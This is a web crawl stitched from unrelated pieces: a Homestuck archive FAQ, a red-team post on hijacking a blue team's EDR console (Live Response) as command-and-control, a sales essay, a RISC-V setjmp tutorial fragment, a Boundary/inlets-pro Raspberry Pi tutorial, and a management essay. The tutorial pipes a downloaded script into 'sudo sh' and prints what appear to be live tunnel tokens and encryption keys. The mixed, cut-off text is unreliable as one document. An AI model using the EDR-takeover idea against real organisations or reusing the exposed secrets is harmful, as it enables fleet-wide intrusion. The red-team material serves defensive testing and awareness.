          </ul>
          <p>
          And that's not even all of it? How big is this thing?
        </p></div>
      </div>
      <h3>Wait, doesn't this have the Epilogues? Or Homestuck^2? What gives?</h3>
      <p><a href="https://www.patreon.com/homestuck" target="_blank">You! Giving to the Homestuck team, that is.</a> The new age of Homestuck is going strong, and it needs your support to continue. I consider the Epilogues, HS^2, and the various games released over the past few years to be under active maintenance, and an ongoing source of income for the creators. Including those in the collection would feel scummy. The main reason it exists is to prevent the technological decay of Homestuck, not to "stick one to the man" or some garbage. Need to read the Epilogues offline? <a href="https://www.viz.com/read/graphic-novel/homestuck-epilogues/product/6154" target="_blank">They made a book for that! It's literally just text!</a> And speaking of books, go and check out <a href="https://www.viz.com/homestuck">Viz's line of deluxe Homestuck hardcovers.</a> They have tons of author commentary you won't find in the collection, because again, I'm <em>really</em> not about harming these guys financially.</p>
      <br>
      
      <h3>So, what's your endgame then?</h3>
      <p>Homestuck is suffering with the decline of Flash, and as long as it exists on the internet, these problems will be inherent to it. The ideal outcome for this collection is that it keeps Homestuck alive for people who may otherwise have given up on it, so they can continue to support all the official channels going forward. If this project results in even one new fan hopping on-board who otherwise wouldn't have, I would consider that a success.</p>

<![CDATA[Leveraging the Blue Team's Endpoint Agent as C2]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>A few years back the Blue Team of a company asked to be targeted in a Red Team Operation.</p>
<p>That was a really fun, because Rules of Engagement commonly prevent targeting Blue Teams. Blue’s infrastructure, systems and team members are often out of scope, unfortunately.</p>
<blockquote>
<p>Blue team infrastructure is a gold mine for credentials, recon but also for remote code execution!</p>
</blockquote>
<p>Often companies do not have adequate protection, procedures (MFA, multi-person attestation), monitoring and auditing in place when it comes to accessing data from endpoint agents. There is also frequently a lack of knowledge on what Endpoint Agents are capable of doing.</p>
<p><strong>So, what better way to compromise the blue team via their own tooling I thought? :)</strong></p>
<p><img src="https://embracethered.com/blog/images/2020/binary.jpg" alt="Attack"></p>
<p>This post is a reiteration of a section in Red Team Strategies about focusing on EDR and endpoint agents, as I still think this threat needs a lot more attention.</p>
<h2 id="endpoint-agents-as-c2">Endpoint Agents as C2</h2>
<p>Endpoint Protection and Response (EDR) agents and solutions like Carbon Black, Crowdstrike’s Falcon, Windows Defender ATP and so forth commonly provide built-in Command &amp; Control infrastructure.</p>
<p>The agents are typically managed via a web interface, so tactics such as <a href="https://attack.mitre.org/techniques/T1550/004/">“Pass the Cookie”</a> might be performed by adversaries after compromising blue team members.</p>
<p>Obviously this can be misused by an adversary.</p>
<p>Once an adversary has access to the Web UI, there are features such as “Go Live”, or “Live Response” that allow access to any host in the organization where the EDR agent is running.</p>
<p><strong>No kidding!</strong></p>
<p>Using this technique is quite elegant, as it does not require the red team to maintain or run their own infrastructure.</p>
<h2 id="products-and-examples">Products and Examples</h2>
<p>There is a wide range of products, but they mostly converge around a common feature set, including establishing interactive shells and command execution on hosts. Here are some examples and details from vendors:</p>
<ul>
<li>
<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/respond-machine-alerts#initiate-live-response-session">Windows Defender ATP - Initiate Live Response Session</a></p>
<blockquote>
<p>“Live response is a capability that gives you instantaneous access to a device by using a remote shell connection.”</p>
</blockquote>
</li>
<li>
<p><a href="https://www.crowdstrike.com/blog/tech-center/remote-remediation-real-time-response/">Crowdstrike - How to Remotely Remediate an Incident</a></p>
<blockquote>
<p>“With the ability to run commands, executables and scripts, the possibilities are endless.”
<a href="https://embracethered.com/blog/images/2020/RTR-gif.gif"><img src="https://embracethered.com/blog/images/2020/RTR-gif.gif" alt="FalconD"></a></p>
</blockquote>
</li>
<li>
<p><a href="https://www.carbonblack.com/blog/screenshot-demo-carbon-black-live-response-in-action/">Carbon Black - “Go Live”</a></p>
<blockquote>
<p>With Live Response, Carbon Black gives you a terminal right in our Web console and via the already-existing sensor on the endpoint. You just click “Go Live” and you’re in.</p>
</blockquote>
</li>
</ul>
<p>During red team operations I have used some of these to get quick root access on arbitrary hosts.</p>
<p><strong>Fun times!</strong></p>
<h2 id="are-these-features-really-needed">Are these features really needed?</h2>
<p>To be fair, for some investigations a blue team member might indeed find a manual shell useful to grab certain log files or other evidence. Although, that should really be an exception - as tasks should be automated as much as possible.</p>
<p>But, it’s also worth noting that these are cloud systems. This means that your blue team is not the only one with access. The vendor might also directly or indirectly have access to this capabilitiy. The attack surface is quite large.</p>
<p>If these risks are acceptable to your business depends on your organization.</p>
<h2 id="so-why-should-the-red-team-test-for-this">So, why should the Red Team test for this?</h2>
<p>A couple of things can be highlighted with such an operation:</p>
<ol>
<li><strong>Detection and Monitoring</strong>: Does the Blue Team and SOC have proper detections and monitoring in place to catch compromise or misuse?</li>
<li><strong>Security Controls</strong>: Are proper security controls in place for the EDR web portal (MFA, multi-person attestation before “going live”), etc.</li>
<li><strong>Auditing</strong>: Are the commands that the blue team member (or attacker) is running logged?</li>
<li><strong>Raising awareness</strong>: Interesting questions might come up as well, for instance does the IT team know about this “backdoor” access to the fleet?</li>
<li><strong>Who watches the watchers?</strong> Requiring rigorous monitoring of these features and performing drills to validate they are not misused is part of the red teams goals</li>
</ol>
<p>Hope this provides some ideas on how to validate the infrastructure and procedures of the blue team is in good shape.</p>
<p>Cheers.

<p>When I started, I got told I couldn’t be in Sales. I couldn’t network; therefore, I’d be a lousy salesperson.&nbsp;</p>



<p>Have they told you before you couldn’t do a job because you lacked the talent? Like becoming a Salesperson? Or a programmer?</p>



<p>“You can’t become X because you don’t know how to network, and you’re not good at math.” That’s what they told me. And it’s complete nonsense.</p>



<p>People think you need to have “it,” a talent.&nbsp;</p>



<p>Before I got into Sales, I was a software developer. They tell similar stories to software developers. “No, you won’t be successful because you suck at Math.” I was never good at math, yet I became quite good at writing software.</p>



<p>Both professions share something. You don’t need to have the unique talent to become successful. Writing Code and selling something are both <strong>skills</strong> you build over time through training.</p>



<p>In Software development, you learn about statements, variables, functions and putting all of it together into a working program. Practice it often enough, and whatever problem you work on, you’ll be able to solve it.&nbsp;</p>



<p>Sales works the same way. You learn about process, handling objections, negotiating, asking the right questions, and eventually, you’ll close deals.&nbsp;</p>



<p>If you’re a software developer reading this, you will most likely think, “But it’s not enough to just learn foundations. There’s OOP, Functional Programming, …”. That’s right. Learning never stops in Software Development. Same for Sales.</p>



<p>There are so many different approaches to sell something to somebody; everything keeps evolving.&nbsp;</p>



<p>I had an eye-opening moment in early 2019. I was attending a sales seminar in Northern Germany. During two days, we learned a lot of useful things. Eventually, we came to the topic of handling objections.&nbsp;</p>



<p>The trainer asked, “Who here has trouble with handling objections? Raise your hand, and we’ll practice this on stage.”</p>



<p>A few people raised their hands, and he picked a young man, working as a photographer. Firstly, he asked the young man, “What are some common objections you hear every day?” and wrote them on a whiteboard. “Ok, then, let’s find a good answer for each of them.” and again wrote down all answers.</p>



<p>Next, they enacted in a role play. The trainer played the customer, mentioning one objection after another. The photographer replied with his canned response, trying to steer the conversation towards a close.&nbsp;</p>



<p>Of course, the photographer would have to put in some more effort to practice a satisfactory reply. Yet, he learned to handle objections within 15 minutes.</p>



<p>I was amazed. Could that be so easy? Later, the trainer did a similar role-play with another audience member to practice closing deals on stage. Within 15 minutes, the attendee could close customers. Amazing.&nbsp;</p>



<p>I took lots of notes and started practicing once I was back at the hotel. I learned new techniques, adopted a new mindset, yet the most crucial aspect was this:</p>



<p>If a small business owner can learn how to handle objections and close deals on stage within 15-20 minutes, I can learn this.&nbsp;</p>



<p>Whenever now prospects object with “It’s too expensive” or “I need to think about this,” I know what to do. I built the confidence to handle these situations.&nbsp;</p>



<p>Therefore, you don’t need talent. You need the right techniques and persistence to learn.&nbsp;</p>

      <h2>October 25, 2020</h2>

      
    </header>

    <p>This post explores RISC-V assembly by examining the implementation of the <code>setjmp</code> and <code>longjmp</code> functions from the C standard library. I frequently find that I grasp concepts more quickly when I have actual code that I can disassemble because it allows me to connect information with intent. I believe RISC-V and similar efforts will fundamentally shift how computers are made and programmed. I hope that sharing my knowledge will inspire the same joy in others that I feel when imagining a future of open hardware.</p>
<p><em>Note: We will be using the RISC-V GNU toolchain throughout this post. If you would like to follow along, you can cross-compile the toolchain for a RISC-V target, or you can download a <a href="https://github.com/sifive/freedom-tools/releases">prebuilt toolchain and emulator</a>. You can also compile and run the programs using a different target toolchain, but the assembly dump will be specific to that architecture. If you are more familiar with a different ISA, this may be a useful way to learn about RISC-V!</em></p>
<h2 id="a-look-at-local-jumps">A Look at Local Jumps</h2>
<p>Jumps are one of the fundamental components of control flow in programming. Nearly any <em>Instruction Set Architecture</em> (ISA) is going to have a jump instruction that lets you modify the program counter to execute the next instruction from the specified location in memory. We also see control flow statements in higher level languages that provide similar logic. An example of this would be the <code>goto</code> statement in C. Using <code>goto</code> is frowned upon by many C programmers due to the ability to create horribly complex code, but it does have useful applications, such as centralized executing of functions, as described in the <a href="https://www.kernel.org/doc/Documentation/process/coding-style.rst">Linux kernel coding style guide</a>. It allows you to define a label, then “go to” that place in your program and resume execution from there. For example, the following program will print <code>Here</code> followed by a newline character over and over again.</p>
<p><code>goto.c</code></p>
<div><pre><code data-lang="c">
<span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span></span>
<span>int</span> main()
{
jumptome:
    printf(<span>"Here</span><span>\n</span><span>"</span>);
    <span>goto</span> jumptome;
}

</code></pre></div><p>Let’s take a look at the generated assembly for <code>main()</code> using <code>objdump</code>:</p>
<div><pre><code data-lang="fallback">
0000000000010158 &lt;main&gt;:
   10158:    1141                    addi   sp,sp,-16
   1015a:    e406                    sd     ra,8(sp)
   1015c:    e022                    sd     s0,0(sp)
   1015e:    0800                    addi   s0,sp,16
   10160:    67c9                    lui    a5,0x12
   10162:    6c078513                addi   a0,a5,1728 # 126c0 &lt;__errno+0xe&gt;
   10166:    1fc000ef                jal    ra,10362 &lt;puts&gt;
   1016a:    bfdd                    j      10160 &lt;main+0x8&gt;

</code></pre></div><p>As you can see, using <code>goto</code> in the program translates directly to the <code>j</code> RISC-V instruction, which jumps to memory address 10160, causing the processor to continuously execute our <code>printf</code> statement. It would be much more clear for us to use a <code>while</code> statement here, but we will actually get the exact same assembly output with an infinite loop:</p>
<p><code>while.c</code></p>
<div><pre><code data-lang="c">
<span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span></span>
<span>int</span> main()
{
    <span>while</span> (<span>1</span>)
    {
        printf(<span>"Here</span><span>\n</span><span>"</span>);
    }
}

</code></pre></div><div><pre><code data-lang="fallback">
0000000000010158 &lt;main&gt;:
   10158:    1141                    addi    sp,sp,-16
   1015a:    e406                    sd      ra,8(sp)
   1015c:    e022                    sd      s0,0(sp)
   1015e:    0800                    addi    s0,sp,16
   10160:    67c9                    lui     a5,0x12
   10162:    6c078513                addi    a0,a5,1728 # 126c0 &lt;__errno+0xe&gt;
   10166:    1fc000ef                jal     ra,10362 &lt;puts&gt;
   1016a:    bfdd                    j       10160 &lt;main+0x8&gt;

</code></pre></div><p>However, <code>goto</code> can provide more functionality than a loop, and is specifically useful for breaking out of a set of deeply nested loops. The aforementioned Linux kernel style guide gives the following example for an appropriate use of <code>goto</code>:</p>
<div><pre><code data-lang="c">
<span>int</span> fun(<span>int</span> a)
{
    <span>int</span> result = <span>0</span>;
    <span>char</span> *buffer;

    buffer = kmalloc(SIZE, GFP_KERNEL);
    <span>if</span> (!buffer)
        <span>return</span> -ENOMEM;

    <span>if</span> (condition1) {
        <span>while</span> (loop1) {
            ...
        }
        result = <span>1</span>;
        <span>goto</span> out_free_buffer;
    }
    ...
out_free_buffer:
    kfree(buffer);
    <span>return</span> result;
}

</code></pre></div><p>In this case, a descriptive label is being used to define a specific error path. Though only a small part of the function body is included here, you can imagine that there could be multiple stages in which the allocated buffer could become full, all of which you would handle by freeing the memory and returning the result. While some may still advocate for never using <code>goto</code>, this demonstrates that there are some benefits, such has not needing to duplicate redundant code throughout the function body.</p>
<h2 id="non-local-jumps">Non-Local Jumps</h2>
<p>Unfortunately (or fortunately if you are a strong proponent of never using <code>goto</code>), it only is valid in a local context. You cannot jump to a label outside of the function in which you are currently executing. For this reason, <code>setjmp</code> and <code>longjmp</code> were added to the C standard library to support non-local jumps. Let’s take a look at a minimal example of using these functions.</p>
<p><code>minimal.c</code></p>
<div><pre><code data-lang="c">
<span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;setjmp.h&gt;</span><span>
</span><span></span>
<span>static</span> jmp_buf buf;

<span>void</span> b()
{
    printf(<span>"in function b</span><span>\n</span><span>"</span>);
    longjmp(buf, <span>1</span>);
}

<span>void</span> a()
{
    printf(<span>"in function a</span><span>\n</span><span>"</span>);
    <span>if</span> (setjmp(buf))
        printf(<span>"back in function a</span><span>\n</span><span>"</span>);
    <span>else</span>
        b();
}

<span>int</span> main()
{
    a();
}

</code></pre></div><div><pre><code data-lang="fallback">
in function a
in function b
back in function a

</code></pre></div><p>We can get a good understanding of what is going on here by taking a look at the <a href="https://www.man7.org/linux/man-pages/man3/setjmp.3.html">setjmp Linux manual page</a>. Specifically for this program, the following portions of the description are important:</p>
<blockquote>
<p>In this case, setjmp() returns 0.</p>
</blockquote>
<blockquote>
<p>The longjmp() function uses the information saved in env to transfer control back to the point where setjmp() was called and to restore (“rewind”) the stack to its state at the time of the setjmp() call.</p>
</blockquote>
<blockquote>
<p>Following a successful longjmp(), execution continues as if setjmp() had returned for a second time.</p>
</blockquote>
<p>In the simplest of terms, these two functions allow us to save an address and return to it at a later point in execution. Behind the scenes, other values are also being saved into the <code>buf</code>, which we will look at momentarily. First, let’s see what the actual assembly output for a 64-bit RISC-V target looks like.</p>

</code></pre></div><p>Here is the implementation of <code>setjmp</code> in RISC-V assembly. Before diving too far in, it is important to understand the registers in the RISC-V architecture. Since we are using a 64-bit machine, each of the 32 general purpose registers is 64 bits wide. Though each of the registers is classified as general purpose, there are calling conventions that most compilers will adhere to.</p>

<p>In addition to the registers, we must understand the few pseudo instructions that <code>setjmp</code> makes use of.</p>
<ul>
<li><code>sd</code>: store doubleword (stores the value in the register specified by the first operand into the address specified by the second)</li>
<li><code>fsd</code>: the floating point counterpart to <code>sd</code></li>
<li><code>li</code>: load immediate (loads the second operand directly into the register specified by the first)</li>
</ul>
<p><em>If you are interested in checking out all of the instructions available when writing RISC-V assembly, take a look at the <a href="https://github.com/riscv/riscv-asm-manual/blob/master/riscv-asm.md">programmer’s manual</a>.</em></p>
<p>So what exactly are we doing here? The behavior of <code>setjmp</code> is specified as storing information about the calling function’s environment into the buffer. If you look back to the source code of <code>minimal.c</code>, you’ll see that we are passing the buffer of type <code>jmp_buf</code> into the <code>setjmp</code> function in <code>a()</code>. If we look at the dump of <code>a()</code> you can see that we are jumping and linking (<code>jal</code>) to the address of the <code>setjmp</code> function:</p>

<p>A few weeks ago, I had the pleasure to join Hashicorp’s second fully virtual conference, <a href="https://hashiconf.com/" target="_blank">HashiConf Digital</a> 2020. Leading to this online conference, they were teasing all of us with the announcement of two new Open Source products. Spread over two keynotes, Armon and Mitchell gave an introduction to those highly kept secret products, <a href="https://www.boundaryproject.io/" target="_blank"><strong>Boundary</strong></a> and <a href="https://www.waypointproject.io/" target="_blank"><strong>Waypoint</strong></a>.</p>

<p>I haven’t looked at Waypoint in detail yet, but here I want to talk specifically about Boundary and what it is. And of course, if you read my previous posts, I couldn’t resist to see if this new project can be of any use in my private Raspberry Pi home lab.</p>

<h2 id="what-is-hashicorp-boundary">What is HashiCorp Boundary?</h2>

<p><strong>Boundary</strong> is a new open source project that enables clients to securely access dynamic hosts and services with fine-grained authorization without requiring direct access to your private network. With Boundary, a user first needs to authenticate using a trusted Identity Provider. Boundary then uses policies and RBAC to define what services authenticated clients can access on a particular network based on their identity.</p>

<p>It is a modern and a more dynamic approach to give secure access to your resources compared to more traditional approaches like SSH bastion hosts or VPNs</p>

<p>In a traditional approach, on-boarding and giving operators access to the machines would typically involve some things to do. For starters, maybe a new VPN profile or a new SSH key needs to be created, which can become hard to manage at scale when more and more people need to be on-boarded. The second subject to consider is to put the required firewall rules in place that allow the operators to only access to appropriate hosts. Such firewalls mostly assume resources are more static, and it is not well suited for the cloud with highly ephemeral and dynamic environments.</p>

<p>Boundary was designed with these core problems in mind: grant access to critical systems with least privilege.</p>

</figure>


<p>As you might know from my previous post, I’m running some Raspberry Pi clusters in my home lab. To get SSH access from anywhere to those little compute units in my private network, I could set up a VPN, but instead I’m a profound user of <a href="https://inlets.dev/" target="_blank"><strong>inlets-pro</strong></a>, a Cloud Native Tunnel for L4 TCP traffic. Using inlets, you can give any Raspberry Pi a public IP address by creating an exit-node on a public cloud provider of your choice. Giving SSH access to a private node with inlets-pro is a common scenario and is explained in detail in <a href="https://docs.inlets.dev/#/get-started/quickstart-tcp-ssh" target="_blank">this tutorial</a> by Alex Ellis</p>

<p>This is not the only use case of inlets; it is, in fact, a powerful tool and can be used for multiple purposes (taken from the <a href="https://docs.inlets.dev/#/?id=use-cases" target="_blank">documentation</a>):</p>

<p><strong><em>For companies - hybrid cloud, multi-cluster and partner access</em></strong></p>

<ul>
<li><em>Low-maintenance, secure, and quick alternative to a VPN</em><br></li>
<li><em>To build a hybrid cloud between existing servers and public cloud for</em><br></li>
<li><em>To migrate on-premises databases and APIs to public cloud</em><br></li>
<li><em>To connect to the private environments of your customers in a SaaS product</em></li>
</ul>

<p><strong><em>For teams and individuals - for public tunnels and Kubernetes connectivity</em></strong></p>

<ul>
<li><em>As a zero-touch VPN - penetrating NAT, firewalls, captive portals and hotel WiFi</em><br></li>
<li><em>When integrating with API that uses webhooks such as Stripe, PayPal or GitHub, you can test live with your local machine</em><br></li>
<li><em>To access your home lab, Owncloud instance, FreeNAS, or Raspberry Pi cluster using SSH and HTTPS</em><br></li>
<li><em>As an alternative to SaaS and or proprietary offerings such as Ngrok and Argo Tunnel where you can use your own DNS, and decide your own rate-limits</em></li>
</ul>

<h2 id="secure-access-with-boundary-inlets-pro">Secure access with Boundary + inlets-pro</h2>

<p>While I can use inlets-pro to give myself access to my private nodes from anywhere, I still have to distribute SSH keys when I want to give a friend or colleague temporary access. Also, because my clusters have many unit, all of them need to be exposed with inlets-pro, or the secure tunnel needs to be created on request, if you want to connect to them. This can become quite a challenge to manage and maintain. This is exactly what Boundary tries to solve. It provides a secure way to access hosts and critical systems without having to manage credentials or expose your network</p>

<p>So I was wondering what it would take to use HashiCorp Boundary, in combination with inlets-pro, to give friends and colleagues access to my SBCs.</p>

<p>The idea here is to install Boundary on a single node of my clusters, and expose this service via an exit-node with inlets-pro.</p>

<h2 id="tutorial">Tutorial</h2>

<p>For this setup, I took a cluster of four Raspberry Pis, running Ubuntu 20.04, all with a proper hostname and a static IP address.</p>

<ul>
<li>orion-rpi4-01 (192.168.0.51)<br></li>
<li>orion-rpi4-02 (192.168.0.52)<br></li>
<li>orion-rpi4-03 (192.168.0.53)<br></li>
<li>orion-rpi4-04 (192.168.0.54)</li>
</ul>

<p>All of them have the SSH server enabled, and for the time being, only one user with name <code>ubuntu</code> is created. One the first one, we are going to install all the components of Boundary:</p>

<p>Here’s the workflow for the tutorial:</p>

<ul>
<li>Install <code>inlets-pro</code> and <code>inletsctl</code><br></li>
<li>Create a tunnel and an exit-sever with a public IP<br></li>
<li>Install Postgres<br></li>
<li>Install Boundary<br></li>
<li>Configure and start a Boundary Controller service<br></li>
<li>Configure and start a Boundary Worker service</li>
</ul>

<h3 id="get-a-public-ip">Get a public IP</h3>

<p>First, let’s give our Raspberry Pi a public IP address.</p>

<p>Grap yourself a inlets-pro license, download inletsctl and use it to get the inlets-pro client:</p>
<div><pre><code data-lang="bash">curl -sSLf https://inletsctl.inlets.dev | sudo sh
sudo inletsctl download --pro</code></pre></div>
<p>Now create an exit-node for your favourite cloud. I’m going to use DigitalOcean, which happens to be the fastest and cheapest.</p>
<div><pre><code data-lang="bash">inletsctl create  <span>\
</span><span></span>  --provider digitalocean <span>\
</span><span></span>  --access-token-file ~/do-access-token <span>\
</span><span></span>  --pro</code></pre></div>
<p>When the program completes running, you’ll be presented with a command you can run to connect to the tunnel and start proxying traffic. Have a close look at this output, because it has the required auth token and the remote URL you will later to create the client-side of the tunnel.</p>

<p>In my case, the public IP address was <code>178.62.111.14</code> and the token <code>kHPqUgb80hE90DkzWiNWtB0BUr2AbUGPBPDw9ozUqAdTjIfdj0R41iLjffbzObgC</code>. During the tutorial, those values are used in several scripts and configuration files, so if you are following along, replace them with your correct values.</p>

<p>Next, on the Raspberry Pi, create the systemd service for the inlets-pro client and start the client part of the tunnel.</p>
<div><pre><code data-lang="bash">export LICENSE<span>=</span><span>""</span>
inlets-pro client --generate<span>=</span>systemd <span>\
</span><span></span>  --url <span>"wss://178.62.111.14:8123/connect"</span> <span>\
</span><span></span>  --token <span>"kHPqUgb80hE90DkzWiNWtB0BUr2AbUGPBPDw9ozUqAdTjIfdj0R41iLjffbzObgC"</span> <span>\
</span><span></span>  --license <span>"</span>$LICENSE<span>"</span> <span>\
</span><span></span>  --port <span>9200</span> <span>\
</span><span></span>  --port <span>9202</span> <span>\
</span><span></span>  --upstream <span>"127.0.0.1"</span> | sudo tee -a /etc/systemd/system/inlets.service

sudo systemctl enable inlets
sudo systemctl start inlets</code></pre></div>
<p>Neat, at this moment, all TCP traffic on port 9200 and 9202 of the public VM is tunnelled towards the Raspberry Pi, although nothing is serving something on those ports yet.</p>

<h3 id="install-postgres-create-the-database-and-a-user">Install Postgres, create the database and a user</h3>

<p>Because I’m running Ubuntu 20.04, the easiest way to install Postgres is using <code>apt</code></p>
<div><pre><code data-lang="bash">sudo apt update
sudo apt install postgresql</code></pre></div>
<p>When installed, connect to Postgres and create a database and a user for Boundary:</p>
<div><pre><code data-lang="bash">sudo -u postgres createuser -s -w boundary
sudo -u postgres psql -c <span>"ALTER ROLE boundary WITH PASSWORD '&lt;your preferred password&gt;';"</span>
sudo -u postgres psql -c <span>"CREATE DATABASE boundary;"</span>
sudo -u postgres psql -c <span>"GRANT ALL PRIVILEGES ON DATABASE boundary TO boundary;"</span></code></pre></div>
<h3 id="download-boundary">Download Boundary</h3>

<p>Download the Boundary binary and install it in the correct place:</p>
<div><pre><code data-lang="bash">curl -o <span>"boundary.zip"</span> -sfL <span>"https://releases.hashicorp.com/boundary/0.1.1/boundary_0.1.1_linux_arm64.zip"</span>
sudo unzip -qq -o <span>"boundary.zip"</span> -d /usr/local/bin</code></pre></div>
<p>and verify the installation:</p>
<div><pre><code data-lang="bash">$ boundary version

Version information:
  Git Revision:        eccd68d73c3edf14863ecfd31f9023063b809d5a
  Version Number:      <span>0</span>.1.1

$ </code></pre></div>
<p>Great! All set and ready to go.</p>

<h3 id="install-boundary-controller-and-worker">Install Boundary Controller and Worker</h3>

<h4 id="configuration">Configuration</h4>

<p>Before starting a Boundary controller and worker, we have to create the proper configuration files and initialize the database. Create the two files:</p>

<ul>
<li>/etc/boundary/controller.hcl</li>
</ul>
<div><pre><code data-lang="hcl">disable_mlock = true

controller {
  name = "orion-rpi4-01"

  database {
      url = "postgresql://boundary:&lt;your preferred password&gt;@localhost/boundary"
  }
}

listener "tcp" {
  address = "127.0.0.1"
  purpose = "api"
  tls_disable = true
}

listener "tcp" {
  address = "127.0.0.1"
  purpose = "cluster"
  tls_disable = false
}

kms "aead" {
  purpose = "root"
  aead_type = "aes-gcm"
  key = "sP1fnF5Xz85RrXyELHFeZg9Ad2qt4Z4bgNHVGtD6ung="
  key_id = "global_root"
}

kms "aead" {
  purpose = "worker-auth"
  aead_type = "aes-gcm"
  key = "8fZBjCUfN0TzjEGLQldGY4+iE9AkOvCfjh7+p0GtRBQ="
  key_id = "global_worker-auth"
}

kms "aead" {
  purpose = "recovery"
  aead_type = "aes-gcm"
  key = "8fZBjCUfN0TzjEGLQldGY4+iE9AkOvCfjh7+p0GtRBQ="
  key_id = "global_recovery"
}</code></pre></div>
<ul>
<li>/etc/boundary/worker.hcl</li>
</ul>
<div><pre><code data-lang="hcl">listener "tcp" {
    purpose = "proxy"
    tls_disable = false
}

worker {
  name = "orion-rpi4-01"

  controllers = [
    "127.0.0.1"
  ]

  public_addr = "178.62.111.14"
}

# must be same key as used on controller config
kms "aead" {
    purpose = "worker-auth"
    aead_type = "aes-gcm"
    key = "8fZBjCUfN0TzjEGLQldGY4+iE9AkOvCfjh7+p0GtRBQ="
    key_id = "global_worker-auth"
}</code></pre></div>
<p>Some parts of the configuration need a little bit of explanation:</p>

<ul>
<li>all the listeners are bind to 127.0.0.1, keeping everything private. Both the controller API and the worker are exposed via the inlets-pro tunnel.<br></li>
<li>For simplicity of this tutorial, TLS is disabled for the API. This is of course, not the recommended approach, so <strong>do enable this for production</strong>.<br></li>
<li>the public address of the worker is set to the public IP address of the exit-node</li>
</ul>

<h4 id="initialize-the-database">Initialize the database</h4>

<p>With those two files in place, now it is time to initialize the database:</p>
<div><pre><code data-lang="bash">sudo boundary database init -config …</code></pre></div></div></div>

Unbeknownst to you, Genghis, the company CEO, just had dinner with other industry leaders and became excited about this new thing called Beezlyboo. Genghis mentions his excitement at Thursday’s executive council meeting, with the company’s top layer of middle management listening in.</p><p>Mandukhai, the middle manager two layers above you, was present. She conveys the takeaways in her regular Friday morning coffee catchup with the managers that report to her, including the Foobar team lead, your boss, Subotai.</p><p>Fighting for relevance after a bumpy year, Subotai grows convinced that working on this Beezlyboo thing might be his ticket back into Mandukhai's good graces.</p><p>You enter the office on Monday morning, unsheathe your sword, and balance it carefully on top of your monitor before sitting down and getting to work. <i>Little do you know that two weeks from now, half your time will be spent on this new thing called Beezlyboo.</i></p><div><h3>How Middle Management Emerges</h3><p>This is an unfortunately common description of how decisions are made in many of today’s <del>Khanates</del> companies. Why is that? Let’s take a look at how communication and decision making evolve as companies grow larger.</p><p>Here’s how many companies begin: <br><img src="https://middle-out.io/images/genghis/2company.png" alt="2 people companies"></p><p>Two founders, working closely to get their new startup off the ground.</p><p>A more mature company might look more like this:<br><img src="https://middle-out.io/images/genghis/k3company.png" alt="Small company"></p><p>That’s Google circa 1999. Individuals hold increasingly defined roles. Management and process are beginning to creep in, but all anyone really wants to do is get on with things, management be damned. Grabbing a colleague to discuss something is as easy as shouting across the office.</p><p>But as companies grow larger, the majority end up looking more like this:<img src="https://middle-out.io/images/genghis/3comp.png" alt="Large company"></p><p>This is of course an over-simplification as every organization maintains informal networks, cross-functional teams, and parallel networks. But it is a useful representation to understand how hierarchies simplify the sharing of information by creating highways for it. Additionally, we will assume that every team operates in a mesh (even if we were not skilled enough to draw those relations).</p><p>See those ‘o’ nodes? That’s middle management. Layers and layers of it. Its main purpose is to simplify decision making and communication by concentrating ownership of different parts of the business in the hands of a select few.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>For the more mathematically inclined, middle management splits the previously shown complete graphs with <span><span><span><math><semantics><mrow><msub><mi>K</mi><mi>n</mi></msub><mo>=</mo><mfrac><mrow><mi>n</mi><mo>(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo>)</mo></mrow><mrow><mn>2</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">K_n = \frac{n(n-1)}{2}</annotation></semantics></math></span></span></span> edges into multiple complete subgraphs with <span><span><span><math><semantics><mrow><msub><mi>M</mi><mi>n</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mi>i</mi><mi>n</mi></msubsup><msub><mi>K</mi><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">M_n = \sum_i^nK_{m(i)+1}</annotation></semantics></math></span></span></span> edges, where <span><span><span><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span></span></span> runs over managers and <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">m(i)</annotation></semantics></math></span></span></span> is the number of people they manage.

When CEO Genghis or Kublai, another middle manager, want to figure out what’s going on with the Foobar team (highlighted above in Millenial pink), all they need do is call Subotai. By concentrating ownership of Foobar in Subotai’s hands, his team is shielded from unnecessary communication, allowing them to focus on their work.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>To illustrate: <span><span><span><math><semantics><mrow><msub><mi>K</mi><mrow><mn>5</mn><mn>0</mn><mn>0</mn><mn>0</mn></mrow></msub><mo>=</mo><mn>1</mn><mn>2</mn><mo separator="true">,</mo><mn>4</mn><mn>9</mn><mn>7</mn><mo separator="true">,</mo><mn>5</mn><mn>0</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">K_{5000} = 12,497,500</annotation></semantics></math></span></span></span>, but introducing 556 managers<a href="#2po"><sup id="2pr">2</sup></a> each with <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>=</mo><mn>1</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">m(i) = 10</annotation></semantics></math></span></span></span> reports gives <span><span><span><math><semantics><mrow><msub><mi>M</mi><mrow><mn>5</mn><mn>5</mn><mn>6</mn></mrow></msub><mo>=</mo><mn>3</mn><mn>0</mn><mo separator="true">,</mo><mn>5</mn><mn>8</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">M_{556} = 30,580</annotation></semantics></math></span></span></span>.

